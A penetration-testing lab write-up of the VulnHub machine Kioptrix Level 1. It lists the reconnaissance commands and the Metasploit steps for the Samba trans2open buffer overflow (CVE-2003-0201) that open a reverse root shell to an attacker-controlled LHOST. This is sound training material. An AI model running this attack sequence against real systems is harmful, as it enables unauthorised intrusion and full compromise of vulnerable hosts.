# Kioptrix Level 1 (VulnHub) Writeup

## Machine Information

* **Machine:** Kioptrix Level 1
* **Platform:** VulnHub
* **Difficulty:** Beginner
* **Operating System:** Linux

---

# Objective

The objective of this assessment was to enumerate the target machine, identify vulnerable services, exploit a remote vulnerability, and obtain root access.

---

# Phase 1 – Reconnaissance

## Host Discovery

The target machine was discovered on the local network.

```bash
netdiscover
```

Target IP:

```text
192.168.29.54
```

---

## Port Enumeration

A comprehensive Nmap scan was performed to identify open ports, running services, service versions, and the operating system.

```bash
nmap -sC -sV -O -oN initial_scan.txt 192.168.29.54
```

### Results

| Port | Service     | Version                 |
| ---- | ----------- | ----------------------- |
| 22   | SSH         | OpenSSH 2.9p2           |
| 80   | HTTP        | Apache 1.3.20           |
| 111  | RPCBind     | RPC Service             |
| 139  | NetBIOS/SMB | Samba                   |
| 443  | HTTPS       | Apache 1.3.20 (mod_ssl) |
| 1024 | Status      | RPC                     |

### Observations

* SSH Version 1 was supported.
* HTTP TRACE method was enabled.
* Apache and OpenSSL versions were outdated.
* Samba was running on port 139.
* The operating system was identified as Linux 2.4.x.

Based on the enumeration results, Samba became the primary attack target.

---

# Phase 2 – SMB Enumeration

SMB enumeration was performed using Enum4Linux.

```bash
enum4linux -a 192.168.29.54 | tee enum4linux.txt
```

### Findings

* Workgroup: **MYGROUP**
* Hostname: **KIOPTRIX**
* Null sessions were permitted.
* SMB service was successfully enumerated.

Although anonymous users could not access administrative shares, the enumeration confirmed that the system was running an old Samba service.

---

# Phase 3 – Vulnerability Research

Since Samba was identified as an outdated service, Exploit-DB was searched for known vulnerabilities.

```bash
searchsploit samba
```

Multiple exploits targeting Samba 2.2.x were identified, including the well-known **trans2open Remote Buffer Overflow**.

Rather than compiling the legacy exploit manually, the Metasploit Framework was used.

---

# Phase 4 – Exploitation

Metasploit was launched.

```bash
msfconsole
```

The Samba exploit module was located.

```bash
search trans2open
```

The Linux module was selected.

```bash
use exploit/linux/samba/trans2open
```

Module options were reviewed.

```bash
show options
```

The target IP address was configured.

```bash
set RHOSTS 192.168.29.54
```

The attacker's IP address was configured for the reverse shell.

```bash
set LHOST <KALI_IP>
```

The exploit was executed.

```bash
run
```

After several attempts, the exploit successfully triggered the Samba buffer overflow and returned a remote root shell.

---

# Phase 5 – Verification

The obtained shell was verified.

```bash
whoami
```

Output:

```text
root
```

User and group information:

```bash
id
```

Output:

```text
uid=0(root).....
```

Kernel information:

```bash
uname -a
```

The successful `uid=0(root)` confirmed complete administrative access to the target system.

---

# Attack Summary

| Phase                        | Result    |
| ---------------------------- | --------- |
| Host Discovery               | ✅ Success |
| Port Enumeration             | ✅ Success |
| SMB Enumeration              | ✅ Success |
| Vulnerability Identification | ✅ Success |
| Exploit Selection            | ✅ Success |
| Remote Code Execution        | ✅ Success |
| Root Access                  | ✅ Success |

---

# Vulnerability Exploited

| Field              | Value                             |
| ------------------ | --------------------------------- |
| Service            | Samba                             |
| Vulnerability      | trans2open Remote Buffer Overflow |
| CVE                | CVE-2003-0201                     |
| Impact             | Remote Code Execution             |
| Privilege Obtained | Root                              |

---

# Tools Used

* Netdiscover
* Nmap
* Enum4Linux
* SearchSploit
* Metasploit Framework
* Kali Linux

---

# Skills Demonstrated

* Network Discovery
* Service Enumeration
* SMB Enumeration
* Vulnerability Assessment
* Exploit Research
* Metasploit Framework
* Remote Code Execution
* Linux Privilege Verification

---

# Lessons Learned

* Enumeration should always precede exploitation.
* Outdated services often expose publicly known vulnerabilities.
* SMB enumeration can reveal valuable information even without valid credentials.
* SearchSploit is useful for identifying publicly available exploits before launching attacks.
* Metasploit simplifies exploitation while still requiring proper target identification and configuration.
* Verifying privileges using commands such as `whoami` and `id` confirms the success of an exploitation attempt.

---

# Conclusion

Kioptrix Level 1 demonstrated the importance of systematic enumeration and vulnerability assessment. By identifying an outdated Samba service, researching applicable exploits, and leveraging the Metasploit Framework, full remote root access was obtained. This machine provided practical experience in SMB enumeration, exploit selection, remote code execution, and privilege verification, reinforcing fundamental penetration testing methodologies.
